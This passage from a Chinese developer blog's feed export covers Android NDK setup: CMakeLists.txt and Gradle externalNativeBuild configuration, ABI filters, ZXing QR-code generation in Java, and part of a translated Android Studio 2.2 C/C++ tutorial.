<p>配置完项目后，您可以使用 <a href="http://docs.oracle.com/javase/7/docs/technotes/guides/jni/spec/jniTOC.html" target="_blank" rel="noopener">JNI 框架</a>从 Java 代码中访问您的原生函数。要构建和运行应用，只需点击 <strong>Run</strong> 从菜单栏运行应用。Gradle 会以依赖项的形式添加您的外部原生构建流程，用于编译、构建原生库并将其随 APK 一起打包。 </p>
<h4 id="创建新的原生源文件"><a href="#创建新的原生源文件" class="headerlink" title="创建新的原生源文件"></a>创建新的原生源文件</h4><p>要在应用模块的主源代码集中创建一个包含新建原生源文件的 cpp/ 目录，请按以下步骤操作：</p>
<ol>
<li>从 IDE 的左侧打开 <strong>Project</strong> 窗格并从下拉菜单中选择 <strong>Project</strong> 视图。</li>
<li>导航到 <strong>您的模块 &gt; src</strong>，右键点击 <strong>main</strong> 目录，然后选择 <strong>New &gt; Directory</strong>。</li>
<li>为目录输入一个名称（例如 cpp）并点击 <strong>OK</strong>。</li>
<li>右键点击您刚刚创建的目录，然后选择 <strong>New &gt; C/C++ Source File</strong>。</li>
<li>为您的源文件输入一个名称，例如 <strong>native-lib</strong>。</li>
<li>从 <strong>Type</strong> 下拉菜单中，为您的源文件选择文件扩展名，例如 <strong>.cpp</strong>。<ul>
<li>点击 <strong>Edit File Types</strong> ，您可以向下拉菜单中添加其他文件类型，例如 .cxx 或 .hxx。在弹出的 <strong>C/C++</strong> 对话框中，从 <strong>Source Extension</strong> 和 <strong>Header Extension</strong>下拉菜单中选择另一个文件扩展名，然后点击 <strong>OK</strong>。</li>
</ul>
</li>
<li>如果您还希望创建一个标头文件，请选中 <strong>Create an associated header</strong> 复选框。</li>
<li>点击 <strong>OK</strong>。</li>
</ol>
<h4 id="创建-CMake-构建脚本"><a href="#创建-CMake-构建脚本" class="headerlink" title="创建 CMake 构建脚本"></a>创建 CMake 构建脚本</h4><p>如果您的原生源文件还没有 CMake 构建脚本，则您需要自行创建一个并包含适当的 CMake 命令。CMake 构建脚本是一个纯文本文件，您必须将其命名为 <code>CMakeLists.txt</code>。本部分介绍了您应包含到构建脚本中的一些基本命令，用于在创建原生库时指示 CMake 应使用哪些源文件。 </p>
<blockquote>
<p>注：如果您的项目使用 ndk-build，则不需要创建 CMake 构建脚本。提供一个指向您的 <a href="https://developer.android.google.cn/ndk/guides/android_mk.html" target="_blank" rel="noopener">Android.mk</a> 文件的路径，<a href="https://developer.android.google.cn/studio/projects/add-native-code.html#link-gradle" target="_blank" rel="noopener">将 Gradle 关联到您的原生库</a>。 </p>
</blockquote>
<p>要创建一个可以用作 CMake 构建脚本的纯文本文件，请按以下步骤操作：</p>
<ol>
<li>从 IDE 的左侧打开 <strong>Project</strong> 窗格并从下拉菜单中选择 <strong>Project</strong> 视图。</li>
<li>右键点击 您的模块 的根目录并选择 <strong>New &gt; File</strong>。<blockquote>
<p><strong>注</strong>：您可以在所需的任意位置创建构建脚本。不过，在配置构建脚本时，原生源文件和库的路径将与构建脚本的位置相关。</p>
</blockquote>
</li>
<li>输入“CMakeLists.txt”作为文件名并点击 OK。<br>现在，您可以添加 CMake 命令，对您的构建脚本进行配置。要指示 CMake 从原生源代码创建一个原生库，请将 <a href="https://cmake.org/cmake/help/latest/command/cmake_minimum_required.html" target="_blank" rel="noopener">cmake_minimum_required()</a> 和 <a href="https://cmake.org/cmake/help/latest/command/add_library.html" target="_blank" rel="noopener">add_library() </a>命令添加到您的构建脚本中： <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Sets the minimum version of CMake required to build your native library.</span><br><span class="line"># This ensures that a certain set of CMake features is available to</span><br><span class="line"># your build.</span><br><span class="line"></span><br><span class="line">cmake_minimum_required(VERSION 3.4.1)</span><br><span class="line"></span><br><span class="line"># Specifies a library name, specifies whether the library is STATIC or</span><br><span class="line"># SHARED, and provides relative paths to the source code. You can</span><br><span class="line"># define multiple libraries by adding multiple add.library() commands,</span><br><span class="line"># and CMake builds them for you. When you build your app, Gradle</span><br><span class="line"># automatically packages shared libraries with your APK.</span><br><span class="line"></span><br><span class="line">add_library( # Specifies the name of the library.</span><br><span class="line">             native-lib</span><br><span class="line"></span><br><span class="line">             # Sets the library as a shared library.</span><br><span class="line">             SHARED</span><br><span class="line"></span><br><span class="line">             # Provides a relative path to your source file(s).</span><br><span class="line">             src/main/cpp/native-lib.cpp )</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>使用 add_library() 向您的 CMake 构建脚本添加源文件或库时，Android Studio 还会在您同步项目后在 Project 视图下显示关联的标头文件。不过，为了确保 CMake 可以在编译时定位您的标头文件，您需要将 <a href="https://cmake.org/cmake/help/latest/command/include_directories.html" target="_blank" rel="noopener">include_directories() </a>命令添加到 CMake 构建脚本中并指定标头的路径：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add_library(...)</span><br><span class="line"></span><br><span class="line"># Specifies a path to native header files.</span><br><span class="line">include_directories(src/main/cpp/include/)</span><br></pre></td></tr></table></figure></p>
<p>CMake 使用以下规范来为库文件命名：<br>    <strong>lib库名称.so</strong><br>例如，如果您在构建脚本中指定“native-lib”作为共享库的名称，CMake 将创建一个名称为 libnative-lib.so 的文件。不过，在 Java 代码中加载此库时，请使用您在 CMake 构建脚本中指定的名称：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static &#123;</span><br><span class="line">    System.loadLibrary(“native-lib”);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p><strong>注</strong>：如果您在 CMake 构建脚本中重命名或移除某个库，您需要先清理项目，Gradle 随后才会应用更改或者从 APK 中移除旧版本的库。要清理项目，请从菜单栏中选择 <strong>Build &gt; Clean Project</strong>。 </p>
</blockquote>
<p>Android Studio 会自动将源文件和标头添加到 Project 窗格的 cpp 组中。使用多个 add_library() 命令，您可以为 CMake 定义要从其他源文件构建的更多库。</p>
<h5 id="添加-NDK-API"><a href="#添加-NDK-API" class="headerlink" title="添加 NDK API"></a>添加 NDK API</h5><p>Android NDK 提供了一套实用的原生 API 和库。通过将 <a href="https://developer.android.google.cn/ndk/guides/stable_apis.html" target="_blank" rel="noopener">NDK</a> 库包含到项目的 CMakeLists.txt 脚本文件中，您可以使用这些 API 中的任意一种。<br>预构建的 NDK 库已经存在于 Android 平台上，因此，您无需再构建或将其打包到 APK 中。由于 NDK 库已经是 CMake 搜索路径的一部分，您甚至不需要在您的本地 NDK 安装中指定库的位置 - 只需要向 CMake 提供您希望使用的库的名称，并将其关联到您自己的原生库。<br>将 <a href="https://cmake.org/cmake/help/latest/command/find_library.html" target="_blank" rel="noopener">find_library()</a> 命令添加到您的 CMake 构建脚本中以定位 NDK 库，并将其路径存储为一个变量。您可以使用此变量在构建脚本的其他部分引用 NDK 库。以下示例可以定位 <a href="https://developer.android.google.cn/ndk/guides/stable_apis.html#a3" target="_blank" rel="noopener">Android 特定的日志支持库</a>并将其路径存储在 log-lib 中：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find_library( # Defines the name of the path variable that stores the</span><br><span class="line">              # location of the NDK library.</span><br><span class="line">              log-lib</span><br><span class="line"></span><br><span class="line">              # Specifies the name of the NDK library that</span><br><span class="line">              # CMake needs to locate.</span><br><span class="line">              log )</span><br></pre></td></tr></table></figure></p>
<p>为了确保您的原生库可以在 log 库中调用函数，您需要使用 CMake 构建脚本中的 <a href="https://cmake.org/cmake/help/latest/command/target_link_libraries.html" target="_blank" rel="noopener">target_link_libraries()</a> 命令关联库：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find_library(...)</span><br><span class="line"></span><br><span class="line"># Links your native library against one or more other native libraries.</span><br><span class="line">target_link_libraries( # Specifies the target library.</span><br><span class="line">                       native-lib</span><br><span class="line"></span><br><span class="line">                       # Links the log library to the target library.</span><br><span class="line">                       $&#123;log-lib&#125; )</span><br></pre></td></tr></table></figure></p>
<p>NDK还以源代码的形式包含一些库，您在构建和关联到您的原生库时需要使用这些代码。您可以使用 CMake 构建脚本中的 <code>add_library()</code>命令，将源代码编译到原生库中。要提供本地 NDK库的路径，您可以使用 <code>ANDROID_NDK</code> 路径变量，Android Studio会自动为您定义此变量。</p>
<p>以下命令可以指示 <code>CMake</code> 构建 <code>android_native_app_glue.c</code>，后者会将 NativeActivity 生命周期事件和触摸输入置于静态库中并将静态库关联到 native-lib：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add_library( app-glue</span><br><span class="line">             STATIC</span><br><span class="line">             $&#123;ANDROID_NDK&#125;/sources/android/native_app_glue/android_native_app_glue.c )</span><br><span class="line"></span><br><span class="line"># You need to link static libraries against your shared native library.</span><br><span class="line">target_link_libraries( native-lib app-glue $&#123;log-lib&#125; )</span><br></pre></td></tr></table></figure></p>
<h5 id="添加其他预构建库"><a href="#添加其他预构建库" class="headerlink" title="添加其他预构建库"></a>添加其他预构建库</h5><p>添加预构建库与为 CMake 指定要构建的另一个原生库类似。不过，由于库已经预先构建，您需要使用 IMPORTED 标志告知 CMake 您只希望将库导入到项目中：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add_library( imported-lib</span><br><span class="line">             SHARED</span><br><span class="line">             IMPORTED )</span><br></pre></td></tr></table></figure></p>
<p>然后，您需要使用 <a href="https://cmake.org/cmake/help/latest/command/set_target_properties.html" target="_blank" rel="noopener">set_target_properties() </a>命令指定库的路径，如下所示。 </p>
<p>某些库为特定的 CPU 架构（或<a href="https://developer.android.google.cn/ndk/guides/abis.html" target="_blank" rel="noopener">应用二进制接口 (ABI)</a>）提供了单独的软件包，并将其组织到单独的目录中。此方法既有助于库充分利用特定的 CPU 架构，又能让您仅使用所需的库版本。要向 CMake 构建脚本中添加库的多个 ABI 版本，而不必为库的每个版本编写多个命令，您可以使用 ANDROID_ABI 路径变量。此变量使用 <a href="https://developer.android.google.cn/ndk/guides/abis.html#sa" target="_blank" rel="noopener">NDK 支持的一组默认 ABI</a>，或者<a href="https://developer.android.google.cn/studio/projects/add-native-code.html#specify-abi" target="_blank" rel="noopener">您手动配置 Gradle </a>而让其使用的一组经过筛选的 ABI。例如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add_library(...)</span><br><span class="line">set_target_properties( # Specifies the target library.</span><br><span class="line">                       imported-lib</span><br><span class="line"></span><br><span class="line">                       # Specifies the parameter you want to define.</span><br><span class="line">                       PROPERTIES IMPORTED_LOCATION</span><br><span class="line"></span><br><span class="line">                       # Provides the path to the library you want to import.</span><br><span class="line">                       imported-lib/src/$&#123;ANDROID_ABI&#125;/libimported-lib.so )</span><br></pre></td></tr></table></figure></p>
<p>为了确保 CMake 可以在编译时定位您的标头文件，您需要使用 <code>include_directories()</code> 命令，并包含标头文件的路径：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include_directories( imported-lib/include/ )</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p><strong>注</strong>：如果您希望打包一个并不是构建时依赖项的预构建库（例如在添加属于 imported-lib 依赖项的预构建库时），则不需要执行以下说明来关联库。<br>要将预构建库关联到您自己的原生库，请将其添加到 CMake 构建脚本的 <code>target_link_libraries()</code> 命令中：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">target_link_libraries( native-lib imported-lib app-glue $&#123;log-lib&#125; )</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>在您构建应用时，Gradle 会自动将导入的库打包到 APK 中。您可以使用 APK 分析器验证 Gradle 将哪些库打包到您的 APK 中。如需了解有关 CMake 命令的详细信息，请参阅 <a href="https://cmake.org/cmake/help/latest/manual/cmake-commands.7.html" target="_blank" rel="noopener">CMake文档</a></p>
<h4 id="将-Gradle-关联到您的原生库"><a href="#将-Gradle-关联到您的原生库" class="headerlink" title="将 Gradle 关联到您的原生库"></a>将 Gradle 关联到您的原生库</h4><p>要将 Gradle 关联到您的原生库，您需要提供一个指向 CMake 或 ndk-build 脚本文件的路径。在您构建应用时，Gradle 会以依赖项的形式运行 CMake 或 ndk-build，并将共享的库打包到您的 APK 中。Gradle 还使用构建脚本来了解要将哪些文件添加到您的 Android Studio 项目中，以便您可以从 Project 窗口访问这些文件。如果您的原生源文件没有构建脚本，则需要先<a href="https://developer.android.google.cn/studio/projects/add-native-code.html#create-cmake-script" target="_blank" rel="noopener">创建 CMake 构建脚本</a>，然后再继续。</p>
<p>将 Gradle 关联到原生项目后，Android Studio 会更新 <strong>Project</strong> 窗格以在 <strong>cpp</strong> 组中显示您的源文件和原生库，在 <strong>External Build Files </strong>组中显示您的外部构建脚本。 </p>
<blockquote>
<p><strong>注</strong>：更改 Gradle 配置时，请确保通过点击工具栏中的 <strong>Sync Project</strong> 应用更改。此外，如果在将 CMake 或 ndk-build 脚本文件关联到 Gradle 后再对其进行更改，您应当从菜单栏中选择 <strong>Build &gt; Refresh Linked C++ Projects</strong>，将 Android Studio 与您的更改同步。</p>
</blockquote>
<h5 id="使用-Android-Studio-UI"><a href="#使用-Android-Studio-UI" class="headerlink" title="使用 Android Studio UI"></a>使用 Android Studio UI</h5><p>您可以使用 Android Studio UI 将 Gradle 关联到外部 CMake 或 ndk-build 项目：</p>
<ol>
<li>从 IDE 左侧打开 <strong>Project</strong> 窗格并选择 <strong>Android</strong> 视图。</li>
<li>右键点击您想要关联到原生库的模块（例如 <strong>app</strong>模块），并从菜单中选择 <strong>Link C++ Project with Gradle</strong>。您应看到一个如图 4 所示的对话框。</li>
<li>从下拉菜单中，选择 <strong>CMake</strong> 或 <strong>ndk-build</strong>。<br> a. 如果您选择 <strong>CMake</strong>，请使用 <strong>Project Path</strong> 旁的字段为您的外部 <strong>CMake</strong> 项目指定 <code>CMakeLists.txt</code> 脚本文件。<br> b. 如果您选择 <strong>ndk-build</strong>，请使用 <strong>Project Path </strong>旁的字段为您的外部 ndk-build 项目指定 <a href="https://developer.android.google.cn/ndk/guides/android_mk.html" target="_blank" rel="noopener">Android.mk</a> 脚本文件。如果 <a href="https://developer.android.google.cn/ndk/guides/application_mk.html" target="_blank" rel="noopener">Application.mk</a> 文件与您的 Android.mk 文件位于相同目录下，Android Studio 也会包含此文件。<br> <img src="/images/android/对话框关联外部.png" alt=" 图 4. 使用 Android Studio 对话框关联外部 C++ 项目。"></li>
</ol>
<h5 id="手动配置-Gradle"><a href="#手动配置-Gradle" class="headerlink" title="手动配置 Gradle"></a>手动配置 Gradle</h5><p>要手动配置 Gradle 以关联到您的原生库，您需要将 externalNativeBuild {} 块添加到模块级 build.gradle 文件中，并使用 cmake {} 或 ndkBuild {} 对其进行配置：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">  ...</span><br><span class="line">  defaultConfig &#123;...&#125;</span><br><span class="line">  buildTypes &#123;...&#125;</span><br><span class="line"></span><br><span class="line">  // Encapsulates your external native build configurations.</span><br><span class="line">  externalNativeBuild &#123;</span><br><span class="line"></span><br><span class="line">    // Encapsulates your CMake build configurations.</span><br><span class="line">    cmake &#123;</span><br><span class="line"></span><br><span class="line">      // Provides a relative path to your CMake build script.</span><br><span class="line">      path &quot;CMakeLists.txt&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>注：如果您想要将 Gradle 关联到现有 ndk-build 项目，请使用 ndkBuild {} 块而不是 cmake {}，并提供 Android.mk 文件的相对路径。如果 Application.mk 文件与您的 Android.mk 文件位于相同目录下，Gradle 也会包含此文件。</p>
</blockquote>
<h5 id="指定可选配置"><a href="#指定可选配置" class="headerlink" title="指定可选配置"></a>指定可选配置</h5><p>您可以在模块级 <code>build.gradle</code> 文件的 <code>defaultConfig {}</code>块中配置另一个 <code>externalNativeBuild {}</code> 块，为 CMake 或 ndk-build 指定可选参数和标志。与 <code>defaultConfig {}</code>块中的其他属性类似，您也可以在构建配置中为每个产品风味重写这些属性。</p>
<p>例如，如果您的 CMake 或 ndk-build 项目定义多个原生库，您可以使用 <code>targets</code>属性仅为给定产品风味构建和打包这些库中的一部分。以下代码示例说明了您可以配置的部分属性：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">  ...</span><br><span class="line">  defaultConfig &#123;</span><br><span class="line">    ...</span><br><span class="line">    // This block is different from the one you use to link Gradle</span><br><span class="line">    // to your CMake or ndk-build script.</span><br><span class="line">    externalNativeBuild &#123;</span><br><span class="line"></span><br><span class="line">      // For ndk-build, instead use ndkBuild &#123;&#125;</span><br><span class="line">      cmake &#123;</span><br><span class="line"></span><br><span class="line">        // Passes optional arguments to CMake.</span><br><span class="line">        arguments &quot;-DANDROID_ARM_NEON=TRUE&quot;, &quot;-DANDROID_TOOLCHAIN=clang&quot;</span><br><span class="line"></span><br><span class="line">        // Sets optional flags for the C compiler.</span><br><span class="line">        cFlags &quot;-D_EXAMPLE_C_FLAG1&quot;, &quot;-D_EXAMPLE_C_FLAG2&quot;</span><br><span class="line"></span><br><span class="line">        // Sets a flag to enable format macro constants for the C++ compiler.</span><br><span class="line">        cppFlags &quot;-D__STDC_FORMAT_MACROS&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  buildTypes &#123;...&#125;</span><br><span class="line"></span><br><span class="line">  productFlavors &#123;</span><br><span class="line">    ...</span><br><span class="line">    demo &#123;</span><br><span class="line">      ...</span><br><span class="line">      externalNativeBuild &#123;</span><br><span class="line">        cmake &#123;</span><br><span class="line">          ...</span><br><span class="line">          // Specifies which native libraries to build and package for this</span><br><span class="line">          // product flavor. If you don&apos;t configure this property, Gradle</span><br><span class="line">          // builds and packages all shared object libraries that you define</span><br><span class="line">          // in your CMake or ndk-build project.</span><br><span class="line">          targets &quot;native-lib-demo&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    paid &#123;</span><br><span class="line">      ...</span><br><span class="line">      externalNativeBuild &#123;</span><br><span class="line">        cmake &#123;</span><br><span class="line">          ...</span><br><span class="line">          targets &quot;native-lib-paid&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Use this block to link Gradle to your CMake or ndk-build script.</span><br><span class="line">  externalNativeBuild &#123;</span><br><span class="line">    cmake &#123;...&#125;</span><br><span class="line">    // or ndkBuild &#123;...&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>要详细了解配置产品风味和构建变体，请参阅<a href="https://developer.android.google.cn/studio/build/build-variants.html" target="_blank" rel="noopener">配置构建变体</a>。如需了解您可以使用 arguments 属性为 CMake 配置的变量列表，请参阅<a href="https://developer.android.google.cn/ndk/guides/cmake.html#variables" target="_blank" rel="noopener">使用 CMake 变量</a>。 </p>
<h5 id="指定-ABI"><a href="#指定-ABI" class="headerlink" title="指定 ABI"></a>指定 ABI</h5><p>默认情况下，Gradle 会针对 <a href="https://developer.android.google.cn/ndk/guides/abis.html#sa" target="_blank" rel="noopener">NDK 支持的 ABI </a>将您的原生库构建到单独的 .so 文件中，并将其全部打包到您的 APK 中。如果您希望 Gradle 仅构建和打包原生库的特定 ABI 配置，您可以在模块级 <code>build.gradle</code> 文件中使用 <code>ndk.abiFilters</code>标志指定这些配置，如下所示：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">  ...</span><br><span class="line">  defaultConfig &#123;</span><br><span class="line">    ...</span><br><span class="line">    externalNativeBuild &#123;</span><br><span class="line">      cmake &#123;...&#125;</span><br><span class="line">      // or ndkBuild &#123;...&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ndk &#123;</span><br><span class="line">      // Specifies the ABI configurations of your native</span><br><span class="line">      // libraries Gradle should build and package with your APK.</span><br><span class="line">      abiFilters &apos;x86&apos;, &apos;x86_64&apos;, &apos;armeabi&apos;, &apos;armeabi-v7a&apos;,</span><br><span class="line">                   &apos;arm64-v8a&apos;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  buildTypes &#123;...&#125;</span><br><span class="line">  externalNativeBuild &#123;...&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在大多数情况下，您只需要在 <code>ndk {}</code> 块中指定 <code>abiFilters</code>（如上所示），因为它会指示 Gradle 构建和打包原生库的这些版本。不过，如果您希望控制 Gradle 应当构建的配置，并独立于您希望其打包到 APK 中的配置，请在 <code>defaultConfig.externalNativeBuild.cmake {}</code> 块（或 <code>defaultConfig.externalNativeBuild.ndkBuild {}</code> 块中）配置另一个 abiFilters 标志。Gradle 会构建这些 ABI 配置，不过仅会打包您在 <code>defaultConfig.ndk{}</code>块中指定的配置。 </p>
<p>为了进一步降低 APK 的大小，请考虑<a href="https://developer.android.google.cn/studio/build/configure-apk-splits.html#configure-abi-split" target="_blank" rel="noopener">配置 ABI APK</a> 拆分，而不是创建一个包含原生库所有版本的大型 APK，Gradle 会为您想要支持的每个 ABI 创建单独的 APK，并且仅打包每个 ABI 需要的文件。如果您配置 ABI 拆分，但没有像上面的代码示例一样指定 <code>abiFilters</code> 标志，Gradle 会构建原生库的所有受支持 ABI 版本，不过仅会打包您在 ABI 拆分配置中指定的版本。为了避免构建您不想要的原生库版本，请为 abiFilters 标志和 ABI 拆分配置提供相同的 ABI 列表。 </p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>ndk</tag>
      </tags>
  </entry>
  <entry>
    <title>Android调用Zxing生成二维码</title>
    <url>/Android/%E8%B0%83%E7%94%A8Zxing%E7%94%9F%E6%88%90%E4%BA%8C%E7%BB%B4%E7%A0%81/</url>
    <content><![CDATA[<p>依赖<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">implementation(&quot;com.google.zxing:core:3.4.1&quot;)</span><br></pre></td></tr></table></figure></p>
<p>调用示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> android.graphics.Bitmap;</span><br><span class="line"><span class="keyword">import</span> android.graphics.Color;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.google.zxing.BarcodeFormat;</span><br><span class="line"><span class="keyword">import</span> com.google.zxing.EncodeHintType;</span><br><span class="line"><span class="keyword">import</span> com.google.zxing.MultiFormatWriter;</span><br><span class="line"><span class="keyword">import</span> com.google.zxing.WriterException;</span><br><span class="line"><span class="keyword">import</span> com.google.zxing.common.BitMatrix;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Bitmap <span class="title">createBitmap</span><span class="params">(String contents, <span class="keyword">int</span> width, <span class="keyword">int</span> height)</span><span class="keyword">throws</span> WriterException </span>&#123;</span><br><span class="line"></span><br><span class="line">        BitMatrix matrix = <span class="keyword">new</span> MultiFormatWriter().encode(contents, BarcodeFormat.QR_CODE, width, height);</span><br><span class="line">        <span class="keyword">int</span>[] pixels = <span class="keyword">new</span> <span class="keyword">int</span>[width * height];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> y = <span class="number">0</span>; y &lt; height; y++) &#123;</span><br><span class="line">            <span class="keyword">int</span> offset = y * width;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> x = <span class="number">0</span>; x &lt; width; x++) &#123;</span><br><span class="line">                pixels[offset + x] = matrix.get(x, y) ? Color.BLACK : Color.WHITE;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);</span><br><span class="line">        bitmap.setPixels(pixels, <span class="number">0</span>, width, <span class="number">0</span>, <span class="number">0</span>, width, height);</span><br><span class="line">        <span class="keyword">return</span> bitmap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面这样创建的是默认样式的二维码，白色边框会比较大，这是个小问题。<br>更多的自定义参数在 <code>Map&lt;EncodeHintType,?&gt; hints</code> 这个参数设置，看以下示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">Map&lt;EncodeHintType,Object&gt; hints = new HashMap&lt;&gt;();</span><br><span class="line">hints.put(EncodeHintType.ERROR_CORRECTION, ErrorCorrectionLevel.H);//容错率最高</span><br><span class="line">hints.put(EncodeHintType.CHARACTER_SET, &quot;UTF-8&quot;);// 字符编码 UTF-8</span><br><span class="line">hints.put(EncodeHintType.MARGIN, 0);//白边大小</span><br><span class="line"></span><br><span class="line">BitMatrix matrix = new MultiFormatWriter().encode(contents, BarcodeFormat.QR_CODE, width, height, hints);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这样设置的就是一个没有白边的二维码</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>在 Android Studio 2.2 中愉快地使用 C/C++</title>
    <url>/Android/%E5%9C%A8Android%20Studio%202.2%20%E4%B8%AD%E6%84%89%E5%BF%AB%E5%9C%B0%E4%BD%BF%E7%94%A8%20C%E5%92%8CC++/</url>
    <content><![CDATA[<blockquote>
<p><a href="http://wl9739.github.io/2016/09/21/%E5%9C%A8-Android-Studio-2-2-%E4%B8%AD%E6%84%89%E5%BF%AB%E5%9C%B0%E4%BD%BF%E7%94%A8-C-C-md/" target="_blank" rel="noopener">本翻译文章原文链接</a><br><strong>这篇文章最新的内容在</strong> <a href="./Java%E5%92%8CAndroid/%E5%90%91%E6%82%A8%E7%9A%84%E9%A1%B9%E7%9B%AE%E6%B7%BB%E5%8A%A0C%E5%92%8CC++%E4%BB%A3%E7%A0%81/">《向您的项目添加 C 和 C++ 代码》</a></p>
</blockquote>
<blockquote>
<p>注：官网上面的技术文章也在不断地汉化中，只是进度有点慢。在我翻译本篇文章的时候，官网没有对应的中文教程。经人提醒，该文章现在在官网已经有对应的中文版教程了，链接地址：<a href="https://developer.android.com/studio/projects/add-native-code.html" target="_blank" rel="noopener">向您的项目添加 C 和 C++代码</a>。有需要的朋友可以直接阅读官方中文解说。</p>
</blockquote>
<p>———–分割线————-</p>
<blockquote>
<p>Android Studio 2.2 正式版发布后，看到更新内容中有提到对 C/C++ 支持的完善，表示非常高兴。然后将官网上这一部分内容翻译出来，如有错误，欢迎指正。<br>原文链接：<a href="https://developer.android.com/studio/projects/add-native-code.html#existing-project" target="_blank" rel="noopener">Add C and C++ Code to Your Project</a></p>
</blockquote>
<p>使用 Android studio，你可以将 C 和 C++ 代码编译成 native library（即 .so 文件），然后打包到你的 APK 中。你的 Java 代码可以通过 Java Native Interface（JNI）调用 native library 中的方法。</p>
<p>Android Studio 默认使用 CMake 编译原生库。由于已经有大量的代码使用了 ndk-build 来编译 native code，所以 Android Studio 同样也支持 ndk build。如果你想导入一个 ndk-build 库到你的 Android Studio 项目中，请参阅后文的 <strong>关联本地库与 Gradle</strong>。然而，如果你创建了一个新的 native 库工程，你应该使用 CMake。</p>
<p>本篇文章将会说明如何使用 Android Studio 来创建、配置 Android 项目，以支持 native code，以及将其运行到你的 app 中。</p>
<blockquote>
<p>注意：要在 Android Studio 中使用 CMake 或者 ndk-build，你需要使用 Android Studio 2.2 或更高的版本，同时需要配合使用 Android Plugin for Gradle 2.2.0 及以上的版本。</p>
</blockquote>
<h3 id="下载-NDK-和构建工具"><a href="#下载-NDK-和构建工具" class="headerlink" title="下载 NDK 和构建工具"></a>下载 NDK 和构建工具</h3><p>要编译和调试本地代码（native code），你需要下面的组件：</p>
<ul>
<li><code>The Android Native Development Kit (NDK)</code>: 让你能在 Android 上面使用 C 和 C++ 代码的工具集。</li>
<li><code>CMake</code>: 外部构建工具。如果你准备只使用 ndk-build 的话，可以不使用它。</li>
<li><code>LLDB</code>: Android Studio 上面调试本地代码的工具。</li>
</ul>
<p>你可以使用 SDK Manager 来安装上述组件：</p>
<ol>
<li>打开一个项目，从菜单栏中选择 Tools &gt; Android &gt; SDK Manager。</li>
<li>点击 SDK Tools 选项卡。</li>
<li>勾选 LLDB，CMake 和 NDK。<br> <img src="http://static.zybuluo.com/wl9739/58b11an8k32rylerlh291f7b/Figure-1.png" alt></li>
<li>点击 Apply，然后点击 OK。</li>
<li>当安装完成后，点击 Finish，然后点击 OK</li>
</ol>
<h3 id="创建支持-C-C-的新项目"><a href="#创建支持-C-C-的新项目" class="headerlink" title="创建支持 C/C++ 的新项目"></a>创建支持 C/C++ 的新项目</h3><p>创建一个支持 native code 的项目和创建普通的 Android studio 工程很像。但是有几点需要留意的地方：</p>
<ol>
<li>在 Configure your new project 选项中，勾选 Include C++ Support 选项。</li>
<li>点击 Next，后面的流程和创建普通的 Android studio 工程一样。</li>
<li>在 Customize C++ Support 选项卡中。你有下面几种方式来自定义你的项目：<ul>
<li>C++ Standard：点击下拉框，可以选择标准 C++，或者选择默认 CMake 设置的 Toolchain Default 选项。</li>
<li>Exceptions Support：如果你想使用有关 C++ 异常处理的支持，就勾选它。勾选之后，Android Studio 会在 module 层的 build.gradle 文件中的 cppFlags 中添加 -fexcetions 标志。</li>
<li>Runtime Type Information Support：如果你想支持 RTTI，那么就勾选它。勾选之后，Android Studio 会在 module 层的 build.gradle 文件中的 cppFlags 中添加 -frtti 标志。</li>
</ul>
</li>
<li>点击 “Finish”</li>
</ol>
<p>当 Android Studio 完成新项目创建后，打开 Project 面板，选择 Android 视图。Android Studio 会添加 cpp 和 External Build Files 目录。</p>
